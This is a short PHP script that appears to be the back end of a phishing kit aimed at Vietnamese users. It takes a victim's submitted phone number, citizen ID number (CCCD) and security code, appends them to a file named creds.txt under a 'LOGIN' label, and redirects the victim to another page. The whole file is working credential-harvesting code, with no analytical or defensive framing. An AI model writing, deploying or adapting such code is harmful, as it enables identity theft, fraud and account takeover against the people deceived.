<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $sdt = $_POST['sdt'] ?? 'N/A';
    $cccd = $_POST['cccd'] ?? 'N/A';
    $capchar = $_POST['capchar'] ?? 'N/A';

    $log = "LOGIN | SDT: $sdt | CCCD: $cccd | Mã bảo mật: $capchar\n";
    file_put_contents("creds.txt", $log, FILE_APPEND);
    
    header("Location: info.html");
    exit();
}
?>
